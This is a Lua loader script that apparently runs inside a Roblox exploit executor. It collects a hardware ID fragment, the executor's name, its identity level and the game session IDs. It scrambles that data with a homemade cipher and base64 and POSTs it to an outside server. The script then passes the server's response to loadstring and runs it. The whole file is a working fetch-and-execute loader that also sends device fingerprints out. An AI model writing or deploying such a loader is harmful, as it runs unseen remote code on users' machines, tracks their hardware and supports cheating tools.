(function(...)
    local gh_h1 = gethwid and gethwid() or "unknown"
    if #gh_h1 < 16 then return end
    local gh_h2 = string.sub(gh_h1, 1, 16)
    local gh_e1 = getexecutorname and getexecutorname() or "unk"
    local gh_i1 = getidentity and getidentity() or 0
    if gh_i1 < 2 then return end

    local a, b = ...
    if not a or not b then return end

    local function gh_gs()
        local gh_chrs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        local gh_res = ""
        for gh_idx = 1, 16 do
            local idx = math.random(1, #gh_chrs)
            gh_res = gh_res .. gh_chrs:sub(idx, idx)
        end
        return gh_res
    end

    local function gh_cc(data)
        local gh_sum = 0x12345678
        for i = 1, #data do
            local gh_b = string.byte(data, i)
            gh_sum = ((gh_sum << 5) | (gh_sum >> 27)) ~ gh_b ~ (i * 17)
            gh_sum = gh_sum & 0xFFFFFFFF
        end
        return string.format("%08x", gh_sum)
    end

    local gh_slt = gh_gs()

    local gh_pl = {
        i = gh_h2,
        s = b,
        e = gh_e1,
        t = math.floor(tick() * 1000),
        p = game.PlaceId or 0,
        j = game.JobId or "unk",
        v = "STELLAR_GUARDIAN_VERIFICATION_DELTA_5M2P_SECURE",
        dt = a,
        salt = gh_slt
    }

    local function gh_ae(data, phrase, salt)
        local gh_res = salt
        local gh_kl = #phrase
        local gh_enc_arr = {}

        for idx = 1, #data do
            gh_enc_arr[idx] = string.byte(data, idx)
        end

        for gh_rnd = 1, 3 do
            for idx = 1, #gh_enc_arr do
                local gh_b = gh_enc_arr[idx]
                local gh_sb = string.byte(salt, ((idx - 1) % 16) + 1)
                local gh_pb = string.byte(phrase, ((idx - 1) % gh_kl) + 1)

                local gh_s1 = gh_b ~ ((idx + gh_rnd * 7) % 256)
                local gh_s2 = gh_s1 ~ gh_pb
                local gh_s3 = ((gh_s2 << 3) | (gh_s2 >> 5)) & 0xFF
                local gh_s4 = gh_s3 ~ gh_sb

                gh_enc_arr[idx] = gh_s4
            end
        end

        for idx = 1, #gh_enc_arr do
            gh_res = gh_res .. string.char(gh_enc_arr[idx])
        end

        return gh_res
    end

    local function gh_b64(data)
        local gh_chrs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        local gh_res = ""
        for gh_idx = 1, #data, 3 do
            local gh_b1, gh_b2, gh_b3 = string.byte(data, gh_idx, gh_idx + 2)
            gh_b2 = gh_b2 or 0
            gh_b3 = gh_b3 or 0
            local gh_bm = (gh_b1 << 16) + (gh_b2 << 8) + gh_b3
            for gh_j = 18, 0, -6 do
                local gh_idx = ((gh_bm >> gh_j) & 63) + 1
                gh_res = gh_res .. gh_chrs:sub(gh_idx, gh_idx)
            end
        end
        local gh_pad = (3 - (#data % 3)) % 3
        gh_res = gh_res:sub(1, #gh_res - gh_pad) .. string.rep("=", gh_pad)
        return gh_res
    end

    task.spawn(function()
        local gh_req = request or http_request
        if not gh_req then return end
        local gh_hs = game:GetService("HttpService")
        local gh_rb = gh_hs:JSONEncode(gh_pl)

        gh_pl.checksum = gh_cc(gh_rb)
        gh_rb = gh_hs:JSONEncode(gh_pl)

        local gh_scr = "QUANTUM_NEXUS_PROTOCOL_ALPHA_7X9K_MATRIX_CIPHER_OMEGA"
        local gh_enc = gh_ae(gh_rb, gh_scr, gh_slt)
        local gh_encb64 = gh_b64(gh_enc)

        local gh_rt = {
            Url = "https://onx-dev.uk/api/v1/script/" .. b,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/octet-stream",
                ["X-Client"] = gh_e1,
                ["X-Identity"] = tostring(gh_i1),
                ["X-Encrypted"] = "true",
                ["X-Salt"] = gh_slt
            },
            Body = gh_encb64
        }

        local gh_rsp = gh_req(gh_rt)
        if gh_rsp and gh_rsp.StatusCode == 200 and gh_rsp.Body then
            local gh_lsr = loadstring(gh_rsp.Body)
            if gh_lsr then
                task.spawn(gh_lsr)
            end
        end
    end)
end)(...)
